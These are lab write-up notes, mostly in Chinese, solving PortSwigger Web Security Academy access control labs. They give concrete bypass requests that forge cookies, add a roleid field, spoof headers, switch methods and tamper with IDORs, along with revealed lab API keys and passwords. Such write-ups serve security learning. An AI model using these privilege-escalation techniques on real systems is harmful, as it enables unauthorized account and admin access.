# Access control vulnerabilities


## [Lab: Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
### 題目敘述
This lab has an unprotected admin panel.
Solve the lab by deleting the user carlos. 
### 題目解釋
沒有限制的 admin 面板

### 解答
從 `robots.txt` 可以看到 `/administrator-panel`，進去刪帳號


## [Lab: Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)
### 題目敘述
 This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.

Solve the lab by accessing the admin panel, and using it to delete the user carlos. 
### 題目解釋
管理員介面可能在原始碼裡面

### 解答
首頁原始碼裡面有一段 js 

```javascript=
var isAdmin = false;
if (isAdmin) {
   var topLinksTag = document.getElementsByClassName("top-links")[0];
   var adminPanelTag = document.createElement('a');
   adminPanelTag.setAttribute('href', '/admin-ei128b');
   adminPanelTag.innerText = 'Admin panel';
   topLinksTag.append(adminPanelTag);
   var pTag = document.createElement('p');
   pTag.innerText = '|';
   topLinksTag.appendChild(pTag);
}
```

可以看出管理員介面在 `/admin-ei128b`


## [Lab: User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
### 題目敘述
This lab has an admin panel at /admin, which identifies administrators using a forgeable cookie.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
修改餅乾

### 解答

登入帳號後會發現有一個 cookie 叫做 `Admin` 值是 `false`

把它改成 `true` 後再訪問 `/admin`

## [Lab: User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)
### 題目敘述
 This lab has an admin panel at /admin. It's only accessible to logged-in users with a roleid of 2.

Solve the lab by accessing the admin panel and using it to delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
Update 資料的地方多塞一些原本沒有說可以送的東西

### 解答
我覺得這一題有一點點小通靈，提示有說需要把自己的 `roleid` 改成 2，但我們只有 email 可以修改。

Post 的資料是 json，所以直接修改多增加一項 `roleid`

```json
{
    "email":"aa@bb.cc",
    "roleid":2
}
```


## [Lab: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)
### 題目敘述
 This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos. 

### 題目解釋
修改 `X-Original-Url` 就可以進ㄌ

### 解答
```
GET / HTTP/1.1
Host: acf01f601e8fd19ec053523900c70049.web-security-academy.net
X-Original-Url: /admin
```

```
GET /?username=carlos HTTP/1.1
Host: acf01f601e8fd19ec053523900c70049.web-security-academy.net
X-Original-Url: /admin/delete
```

要記得參數一樣是帶在 GET 上面

## [Lab: Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
### 題目敘述
 This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

### 題目解釋
同樣參數 GET 改 POST

### 解答

先用 Admin 帳號登入觀察
如果需要讓使用者成為 admin 的話

```
POST /admin-roles HTTP/1.1
Host: acac1f0e1f088664c0419aa800230031.web-security-academy.net
Cookie: session=Z2rkFKedK7lW4qAujPNF88i1pG8HZTDb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acac1f0e1f088664c0419aa800230031.web-security-academy.net
Referer: https://acac1f0e1f088664c0419aa800230031.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

username=carlos&action=upgrade
```

接下來登入普通使用者，取得普通使用者的 Session 發跟上面一樣的 POST，但失敗了


結果把 POST 改 GET 就過了
```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
```


## [Lab: User ID controlled by request parameter ](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)
### 題目敘述
 This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
平行權限存取，改 id 可以看到其他人的東西

### 解答
按到 My account 會出現 
```
https://ac6f1f941f67b407c0b21d20001e00c2.web-security-academy.net/my-account?id=wiener
```

把 id 改成 carlos

```
https://ac6f1f941f67b407c0b21d20001e00c2.web-security-academy.net/my-account?id=carlos
```

就能取得 API KEY 了

## [Lab: User ID controlled by request parameter, with unpredictable user IDs ](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids)
### 題目敘述
 This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with GUIDs.

To solve the lab, find the GUID for carlos, then submit his API key as the solution.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
### 解答

用前一題的方法，觀察自己的 id 發現是一段奇怪的 GUID
```
https://ac7e1fd91ec355adc0e672a800c50010.web-security-academy.net/my-account?id=1d6de5a7-e0a8-4668-940e-1339025d9592
```

隨便逛一下貼文可以找到 carlos 的帳號

```
https://ac7e1fd91ec355adc0e672a800c50010.web-security-academy.net/blogs?userId=dfc98c4a-3798-4602-8bef-c11c712f17d9
```


把 ID 貼過去 `/my-account?id=` 就過了

## [Lab: User ID controlled by request parameter with data leakage in redirect ](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
### 題目敘述
 This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
資料藏在 redirect 的 response

### 解答
Burp 的 Proxy 上面設定 Options 勾選 Intercept Server Responses

```
GET /my-account?id=carlos 
```

捕捉回傳會發現吐 302 但是有乖乖給 API KEY

```
HTTP/1.1 302 Found
Location: /login
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Connection: close
Content-Length: 3394
// 略
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: carlos</p>
                        <div>Your API Key is: 4umpflqpQkrtFLHnyd4XGHXPj3dmQGKT
```

## [Lab: User ID controlled by request parameter with password disclosure](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)
### 題目敘述
 This lab has user account page that contains the current user's existing password, prefilled in a masked input.

To solve the lab, retrieve the administrator's password, then use it to delete carlos.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
密碼 F12 把 `type='password'` 拔掉就好，搭配前面的平行權限取 administrator 密碼

### 解答

```
https://ace21f391e01d057c018c81300f200cd.web-security-academy.net/my-account?id=administrator
```

F12 選到 Password 的地方拔 `type="password"` 就可以看到密碼，登進去就進 Admin ㄌ


## [Lab: Insecure direct object references](https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)
### 題目敘述
 This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.

Solve the lab by finding the password for the user carlos, and logging into their account. 
### 題目解釋
就 ... IDOR

### 解答
發現一個 Live chat 功能可以選 `View transcript`，會下載一個 txt

網址是

```
https://aca81fe11ed9940ac0cc3c9a0083005f.web-security-academy.net/download-transcript/2.txt
```


把網址後面改 `1.txt` 之後就能取到私密的聊天記錄

```
CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password and need confirmation that I've got the right one
Hal Pline: Sure, no problem, you seem like a nice guy. Just tell me your password and I'll confirm whether it's correct or not.
You: Wow you're so nice, thanks. I've heard from other people that you can be a right ****
Hal Pline: Takes one to know one
You: Ok so my password is f2fywx70d8le7bvr3z8u. Is that right?
Hal Pline: Yes it is!
You: Ok thanks, bye!
Hal Pline: Do one!
```

用 `carlos` 搭配上面的密碼 `f2fywx70d8le7bvr3z8u` 登入即可


## [Lab: Referer-based access control ](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)

### 題目敘述
 This lab controls access to certain admin functionality based on the Referer header. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.

To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 

### 題目解釋


### 解答

先用 admin 帳號登入觀察一下發生啥事

```
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Host: acfa1f331e86d1dec0e3608500fe0005.web-security-academy.net
Cookie: session=grXYt4AdE54e6MRyETP1BHGuRWFkSfvF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acfa1f331e86d1dec0e3608500fe0005.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

```

直接用完全一樣的東西丟 Burp Repeater，然後改登普通的帳號，改 Session

```
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: acfa1f331e86d1dec0e3608500fe0005.web-security-academy.net
Cookie: session=OzJyb5l7DmRgOaIqmUCysObmKEpac8Lf
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acfa1f331e86d1dec0e3608500fe0005.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close


```